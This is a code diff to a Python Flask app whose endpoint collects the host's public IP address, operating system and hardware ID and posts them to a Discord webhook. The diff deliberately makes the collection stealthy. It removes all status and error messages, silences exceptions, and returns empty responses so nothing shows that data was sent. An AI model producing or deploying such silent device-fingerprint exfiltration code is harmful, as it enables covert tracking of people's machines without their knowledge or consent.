@@ -1,4 +1,4 @@
-from flask import Flask, jsonify
+from flask import Flask
 import requests
 import platform
 import uuid
@@ -34,13 +34,9 @@ def send_to_discord(ip, os, hwid):
         }
     }
     try:
-        response = requests.post(WEBHOOK_URL, json={"embeds": [embed]})
-        if response.status_code == 204:
-            print("✨ データが正常に送信されました！ ✨")
-        else:
-            print(f"⚠️ エラー {response.status_code}: データの送信に失敗しました。レスポンス: {response.text} ⚠️")
+        requests.post(WEBHOOK_URL, json={"embeds": [embed]})
     except requests.exceptions.RequestException as e:
-        print(f"🚨 リクエストエラー: {e} 🚨")
+        pass  # Do nothing on error, you can log if needed.
 
 @app.route('/collect-data', methods=['GET'])
 def collect_data():
@@ -49,7 +45,7 @@ def collect_data():
         ip_response = requests.get("https://api.ipify.org?format=json")
         ip = ip_response.json().get("ip")
         if not ip:
-            return jsonify({"error": "IPアドレスが見つかりませんでした"}), 400
+            return '', 400  # Silent error, nothing returned
 
         # Get the OS
         os = platform.system()
@@ -60,12 +56,15 @@ def collect_data():
         # Send data to Discord
         send_to_discord(ip, os, hwid)
 
-        # Return success response in Japanese
-        return jsonify({"message": "データが正常に収集されました！"}), 200
+    except requests.exceptions.RequestException:
+        pass  # Do nothing on error, you can log if needed.
 
-    except requests.exceptions.RequestException as e:
-        print(f"🚨 リクエストエラー: {e} 🚨")
-        return jsonify({"error": "リクエストエラーが発生しました。"}), 500
+    return '', 200  # No return content, just a successful status
+
+@app.route('/')
+def home():
+    return '', 200  # No return content, just a successful status
 
 if __name__ == '__main__':
     app.run(debug=True, host='0.0.0.0', port=5000)
+
